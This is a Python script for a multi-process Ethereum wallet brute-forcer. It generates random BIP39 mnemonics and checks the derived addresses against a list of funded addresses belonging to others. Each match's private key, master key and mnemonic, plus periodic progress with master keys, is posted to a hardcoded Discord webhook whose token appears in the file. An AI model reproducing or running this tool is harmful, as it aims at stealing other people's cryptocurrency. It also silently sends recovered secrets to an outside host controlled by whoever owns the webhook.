import ctypes
import time
import argparse
import multiprocessing
from bip_utils import Bip32Slip10Secp256k1, Bip39MnemonicGenerator, Bip39SeedGenerator, Bip39WordsNum, EthAddrEncoder
from rich import print
import sys
import signal
import requests
import datetime

# إضافة Webhook URL ثابت في بداية الملف
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1347354458769592330/tD4Xii-C5dbPJVxfBcqt-WQ8xtQr3OAhU8r9E24TJSza73rdSVrd2c4hr3V8zvVdHHUW"

def signal_handler(signum, frame):
    print("\n[red]Stopping all processes...[/red]")
    sys.exit(0)

def send_discord_webhook(webhook_url, content, color=0x00ff00):
    data = {
        "embeds": [{
            "title": "Crypto Magic Scanner",
            "description": content,
            "color": color,
            "timestamp": datetime.datetime.utcnow().isoformat()
        }]
    }
    try:
        requests.post(webhook_url, json=data)
    except Exception as e:
        print(f"[red]Error sending webhook: {str(e)}[/red]")

def worker_process(add, logpx, thread_id):
    z = 0
    fu = 0
    logp = 0
    last_webhook_time = time.time()  # وقت آخر إرسال للwebhook
    WEBHOOK_INTERVAL = 900  # إرسال تحديث كل ربع ساعة (900 ثانية)
    
    start_message = f"🚀 Started ETH Scanner\nThread: {thread_id}\nTime: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    send_discord_webhook(DISCORD_WEBHOOK_URL, start_message, 0x3498db)

    try:
        while True:
            z += 1
            if sys.platform == 'win32':
                ctypes.windll.kernel32.SetConsoleTitleW(f"Thread {thread_id} - MATCH:{fu} SCAN:{z}")
            
            try:
                mnemonic = Bip39MnemonicGenerator().FromWordsNumber(Bip39WordsNum.WORDS_NUM_24)
                seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
                bip32_mst_ctx = Bip32Slip10Secp256k1.FromSeed(seed_bytes)
                MasterKey = bip32_mst_ctx.PrivateKey().Raw().ToHex()
                bip32_der_ctx = bip32_mst_ctx.DerivePath("m/44'/60'/0'/0/0")
                PrivateKeyBytes = bip32_der_ctx.PrivateKey().Raw().ToHex()
                addr = EthAddrEncoder.EncodeKey(bip32_der_ctx.PublicKey().KeyObject())
                Words24 = str(mnemonic)

                if addr in add:
                    fu += 1
                    match_message = (
                        f"💎 **MATCH FOUND!**\n"
                        f"```\n"
                        f"Address: {addr}\n"
                        f"Private Key: {PrivateKeyBytes}\n"
                        f"Master Key: {MasterKey}\n"
                        f"Mnemonic: {mnemonic}\n"
                        f"```"
                    )
                    send_discord_webhook(DISCORD_WEBHOOK_URL, match_message, 0xe74c3c)
                    print(f"[green1][+] MATCH ADDRESS FOUND IN LIST IMPORTED :[/green1] [white]{addr}[/white]")
                    print(
                        f"PrivateKey (Byte) : [green1]{PrivateKeyBytes}[/green1]\n[gold1]{mnemonic}[/gold1]\n[red1]MasterKey (Byte) : [/red1][green1]{MasterKey}[/green1]")
                    with open(f'FoundMATCHAddr_{thread_id}.txt', 'a') as f:
                        f.write(
                            f"{addr}\n{PrivateKeyBytes}\n{mnemonic}\n{MasterKey}\n------------------------- MMDRZA.Com -------------------\n")
                
                elif int(z) % int(logpx) == 0:
                    logp += int(logpx)
                    current_time = time.time()
                    
                    # نرسل تحديث فقط إذا مر الوقت المحدد
                    if current_time - last_webhook_time >= WEBHOOK_INTERVAL:
                        progress_message = (
                            f"⚡ **Progress Update**\n"
                            f"```\n"
                            f"Thread: {thread_id}\n"
                            f"Generated: {logp} ETH addresses\n"
                            f"Time: {time.thread_time()} seconds\n"
                            f"Master Key: {MasterKey.upper()}\n"
                            f"Mnemonic: {Words24[0:64]}...\n"
                            f"```"
                        )
                        send_discord_webhook(DISCORD_WEBHOOK_URL, progress_message, 0xf1c40f)
                        last_webhook_time = current_time
                    
                    # طباعة التقدم في الكونسول كالمعتاد
                    print(
                        f"[Thread {thread_id}][red][[green1]+[/green1]][GENERATED[white] {logp}[/white] ETH ADDR][sK/Th:[white]{time.thread_time()}[/white]][/red]")
                    print(
                        f"[red][MasterKey : [white]{MasterKey.upper()}[/white]][/red]\n[white on red3][MNEMONIC : {Words24[0:64]}...][/white on red3]")
                else:
                    print(
                        f"[Thread {thread_id}][red][-][ GENERATED [cyan]{z}[/cyan] ETH ADDR ][FOUND:[white]{fu}[/white]][/red]",
                        end="\r")
                    
            except Exception as e:
                print(f"[red]Error in thread {thread_id}: {str(e)}[/red]")
                continue
                
    except KeyboardInterrupt:
        print(f"\n[yellow]Thread {thread_id} stopped[/yellow]")

def Main():
    parser = argparse.ArgumentParser(description="Ethereum Address Finder Script")
    
    parser.add_argument('-f', '--file', dest="filenameEth", required=True,
                        help="Ethereum Rich Address File With Type Format .TXT [Example: -f eth5.txt]")
    parser.add_argument('-v', '--view', dest="ViewPrint", required=True,
                        help="Print After Generated This Number Print And Report")
    parser.add_argument('-n', '--thread', dest="ThreadCount", required=True,
                        help="Total Thread Number (Total Core CPU)")

    args = parser.parse_args()
    
    try:
        with open(args.filenameEth) as f:
            add = set(f.read().split())
    except FileNotFoundError:
        print(f"[red]Error: File {args.filenameEth} not found[/red]")
        return
    except Exception as e:
        print(f"[red]Error reading file: {str(e)}[/red]")
        return

    thread_count = int(args.ThreadCount)
    if thread_count <= 0:
        print("[red]Thread count must be greater than 0[/red]")
        return
        
    signal.signal(signal.SIGINT, signal_handler)
    
    start_message = (
        f"🎮 **ETH Scanner Started**\n"
        f"```\n"
        f"File: {args.filenameEth}\n"
        f"Threads: {args.ThreadCount}\n"
        f"Report Every: {args.ViewPrint} addresses\n"
        f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"```"
    )
    send_discord_webhook(DISCORD_WEBHOOK_URL, start_message, 0x2ecc71)
    
    jobs = []
    try:
        for i in range(thread_count):
            p = multiprocessing.Process(
                target=worker_process,
                args=(add, args.ViewPrint, i)
            )
            jobs.append(p)
            p.start()
            print(f"[green]Started thread {i}[/green]")

        for job in jobs:
            job.join()
            
    except KeyboardInterrupt:
        print("\n[yellow]Stopping all processes...[/yellow]")
        for job in jobs:
            job.terminate()
            job.join()
    
    print("[green]All processes completed[/green]")

if __name__ == '__main__':
    Main()